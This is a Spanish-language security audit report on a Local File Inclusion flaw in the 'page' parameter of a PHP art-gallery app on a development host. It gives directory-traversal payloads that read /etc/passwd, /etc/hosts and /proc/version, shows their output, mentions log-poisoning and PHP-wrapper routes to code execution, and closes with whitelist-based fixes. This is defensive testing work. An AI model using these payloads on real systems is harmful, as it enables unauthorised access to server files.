# Informe de Auditoría de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 15:53:01  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Resultado:** VULNERABILIDAD ENCONTRADA Y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se ha identificado y explotado una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor sin autenticación.

---

## 2. Descripción de la Aplicación

La aplicación es una galería de arte virtual con las siguientes secciones:
- Arte Moderno (`gallery.php?page=modern`)
- Arte Clásico (`gallery.php?page=classic`)
- Arte Abstracto (`gallery.php?page=abstract`)
- Acerca de (`gallery.php?page=about`)

---

## 3. Vulnerabilidad Detectada

### 3.1 Local File Inclusion (LFI)

| Campo | Detalle |
|-------|---------|
| **URL vulnerable** | `http://web.dev.local:8081/gallery.php` |
| **Parámetro vulnerable** | `page` |
| **Método** | GET |
| **Severidad** | Crítica |
| **CVSS Score estimado** | 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L) |

### 3.2 Descripción Técnica

El parámetro `page` del archivo `gallery.php` incluye directamente el valor proporcionado por el usuario sin ningún tipo de sanitización o validación. Esto permite el uso de secuencias de traversal de directorios (`../`) para acceder a archivos fuera del directorio web raíz.

---

## 4. Explotación

### 4.1 Prueba de Concepto - Lectura de /etc/passwd

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado obtenido:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Prueba de Concepto - Lectura de /etc/hosts

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/hosts
```

**Resultado obtenido:**
```
127.0.0.1   localhost
::1         localhost ip6-localhost ip6-loopback
fe00::      ip6-localnet
ff00::      ip6-mcastprefix
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters
172.19.0.2  d5054e367753
```

### 4.3 Prueba de Concepto - Información del sistema operativo (/proc/version)

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../proc/version
```

**Resultado obtenido:**
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

---

## 5. Información Descubierta del Sistema

- **Sistema operativo:** Linux Ubuntu (kernel 6.8.0-110-generic)
- **Dirección IP del contenedor:** 172.19.0.2
- **Hostname del contenedor:** d5054e367753
- **Usuario del servidor web:** www-data (UID 33)
- **Usuarios con shell en el sistema:** root (/bin/bash)
- **Servidor web:** PHP (con soporte de `include()` sin validación)

---

## 6. Impacto

La explotación de esta vulnerabilidad permite:

1. **Divulgación de información sensible:** Lectura de archivos de configuración, contraseñas, claves privadas, etc.
2. **Enumeración del sistema:** Identificación del SO, usuarios, servicios, red.
3. **Escalada potencial:** Lectura de logs del servidor web para inyección de código (Log Poisoning).
4. **Posible ejecución remota de código (RCE):** A través de wrappers PHP (`php://input`, `php://filter`, `data://`) o envenenamiento de logs.

---

## 7. Recomendaciones

### 7.1 Corrección inmediata

1. **Usar una lista blanca de páginas permitidas:**
```php
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'];
if (!in_array($page, $allowed_pages)) {
    $page = 'modern'; // página por defecto
}
include("pages/" . $page . ".php");
```

2. **Sanitizar la entrada del usuario:**
```php
$page = basename(preg_replace('/\.php$/', '', $_GET['page']));
$file = "pages/" . $page . ".php";
if (file_exists($file) && strpos(realpath($file), realpath("pages/")) === 0) {
    include($file);
}
```

### 7.2 Medidas adicionales

- **Deshabilitar `allow_url_include`** en `php.ini`
- **Configurar `open_basedir`** para limitar el acceso del PHP al directorio de la aplicación
- **Implementar validación estricta** de todos los parámetros de entrada
- **Activar un WAF** (Web Application Firewall) que detecte payloads de traversal
- **Revisar permisos de archivos** del servidor para minimizar lo accesible por www-data

---

## 8. Conclusión

La aplicación web "Galería de Arte Virtual" presenta una vulnerabilidad crítica de Local File Inclusion en el parámetro `page` de `gallery.php`. Esta vulnerabilidad fue explotada exitosamente para leer archivos sensibles del sistema incluyendo `/etc/passwd`, `/etc/hosts` y `/proc/version`. Se recomienda corrección inmediata implementando validación por lista blanca y configurando correctamente las directivas de seguridad de PHP.

---

*Informe generado el 2026-04-30 por análisis automatizado de seguridad web.*
